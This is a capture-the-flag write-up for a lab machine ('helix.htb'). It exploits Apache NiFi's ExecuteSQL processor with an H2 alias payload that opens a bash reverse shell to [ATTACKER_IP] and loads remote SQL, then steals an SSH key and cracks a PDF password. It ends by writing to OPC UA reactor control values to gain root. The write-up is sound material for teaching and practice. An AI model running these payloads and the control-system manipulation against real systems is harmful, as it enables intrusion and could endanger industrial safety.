## 2. Reconnaissance

  

### 2.1 Nmap Port Scanning

  

I started by scanning the target for open ports and services:

  

```bash

nmap -p- -sV -sC -T4 [TARGET_IP]

```

  

**The scan revealed:**

  

- **22/tcp** — OpenSSH 8.9p1 Ubuntu 3ubuntu0.10

- **80/tcp** — Nginx HTTP

- **8080/tcp** — Apache NiFi

  

During virtual host enumeration, I identified `flow.helix.htb` as a host pointing to the NiFi management interface. I added the hostname to `/etc/hosts` and accessed it through the browser.

  

---

  

## 3. Initial Access

  

### 3.1 Apache NiFi 1.21.0 Analysis

  

Visiting `http://flow.helix.htb:8080/nifi` exposed a NiFi instance that allowed the creation of controller services and processors. This represented a serious misconfiguration.

  

The goal was to abuse the `ExecuteSQL` processor for remote code execution. NiFi supports multiple database backends. On the target, an H2 Database JAR was present at `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`. H2 is known for supporting Java aliases that can be abused to run arbitrary Java code.

  

### 3.2 Exploiting ExecuteSQL via H2

  

**Step 1: Configure the controller service**

  

I created a `DBCPConnectionPool` controller service with the following properties:

  

- **Database Connection URL:** `jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3`

- **Database Driver Class Name:** `org.h2.Driver`

- **Database Driver Location:** `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`

  

**Step 2: Build the payload**

  

I created an `rce.sql` file on my machine and hosted it with a Python HTTP server:

  

```bash

python3 -m http.server 8000

```

  

Example SQL payload:

  

```sql

CREATE ALIAS IF NOT EXISTS PWN EXEC AS $$

String pwn(String cmd) throws java.io.IOException {

    Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});

    return "pwned";

}

$$;

CALL PWN('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"');

```

  

**Step 3: Trigger execution**

  

I created an `ExecuteSQL` processor, pointed it at the controller service, and used the following query to load the remote SQL file:

  

```sql

RUNSCRIPT FROM 'http://[ATTACKER_IP]:8000/rce.sql'

```

  

After starting a Netcat listener with `nc -lvnp 4444`, the processor was started and a shell was obtained as the `nifi` user.

## 4. Lateral Movement

  

### 4.1 Support Bundle Review

  

The `nifi` user is a restricted service account with limited privileges. I enumerated the NiFi installation directory at `/opt/nifi-1.21.0/`.

  

The `support-bundles` directory was especially interesting because NiFi uses it for diagnostics and packaging logs/configuration. In many real environments, sensitive data can accidentally be included there.

  

```bash

nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls -la

```

  

I found a backup private key file named `operator_id_ed25519.bak`, which belonged to the `operator` user. I copied the file for offline review.

  

### 4.2 Accessing the Operator Account

  

Using the recovered SSH key, I authenticated as `operator`:

  

```bash

chmod 600 id_ed25519_operator

ssh -i id_ed25519_operator operator@[TARGET_IP]

```

  

This granted access to the `operator` account and allowed me to capture the user flag.

  

**User Flag:** `[REDACTED]`

## 5. Privilege Escalation

  

### 5.1 Reviewing ICS Documentation

  

Inside the operator home directory, I found two important files:

  

- `control systems diagram.png` — a diagram of reactor sensors and control components

- `Operator Control & Safety Guide.pdf` — a password-protected operational manual

  

I transferred both files to my Kali machine for analysis.

  

I then attempted to recover the PDF password using John the Ripper:

  

```bash

pdf2john 'Operator Control & Safety Guide.pdf' > pdf_hash.txt

sudo gunzip /usr/share/wordlists/rockyou.txt.gz

john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt

```

  

The password was recovered as `operator1`.

  

After opening the PDF, I discovered that the privileged maintenance window could be triggered when the PLC observed simulated hazardous conditions over OPC UA.

  

The relevant conditions were:

  

- Temperature `>= 295°C`

- Pressure `>= 73 bar`

- Mode set to `MAINTENANCE`

  

### 5.2 Internal Network Reconnaissance

  

Using `ss -tulpn` on the target, I found two services bound to localhost:

  

- **8081** — Web-based HMI for the reactor

- **4840** — OPC UA service

  

Running `sudo -l` showed that `operator` could execute `/usr/local/sbin/helix-maint-console` without a password. However, the maintenance window was still closed at this stage.

  

### 5.3 OPC UA Interaction Through SSH Tunneling

  

Because port 4840 was not publicly exposed and the required Python library was not available on the target, I used SSH port forwarding:

  

```bash

ssh -L 4840:127.0.0.1:4840 operator@[TARGET_IP] -i id_ed25519_operator

```

  

I then used a Python script with the `opcua` library to enumerate and modify the relevant nodes. The structure showed variables under the `Reactor` and `Control` nodes.

  

**Example script (`root_exploit.py`):**

  

```python

from opcua import Client

import time

  

url = "opc.tcp://127.0.0.1:4840/helix/"

client = Client(url)

  

try:

    client.connect()

    print("[+] Connected to OPC UA via tunnel")

  

    nodes = {}

    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:

        for child in client.get_node(parent_id).get_children():

            nodes[child.get_browse_name().Name] = child

  

    nodes["Mode"].set_value("MAINTENANCE")

    nodes["TestOverride"].set_value(True)

    nodes["CalibrationOffset"].set_value(20.0)

  

    print("[+] Payload injected. Hazardous condition simulated!")

    time.sleep(5)

  

finally:

    client.disconnect()

```

  

### 5.4 Final Privilege Escalation

  

After running the script, the reactor temperature on the HMI rose to **301.4°C**. I rechecked the local web interface at `http://127.0.0.1:8081`, and the `Privileged Maintenance Window` state changed to **OPEN**.

  

At that point, the privileged maintenance console could be executed through sudo:

  

```bash

operator@helix:~$ sudo /usr/local/sbin/helix-maint-console

[+] Privileged maintenance access granted

root@helix:/home/operator# id

uid=0(root) gid=0(root) groups=0(root)

```

  

This resulted in full root compromise.

  

**Root Flag:** `[REDACTED]`
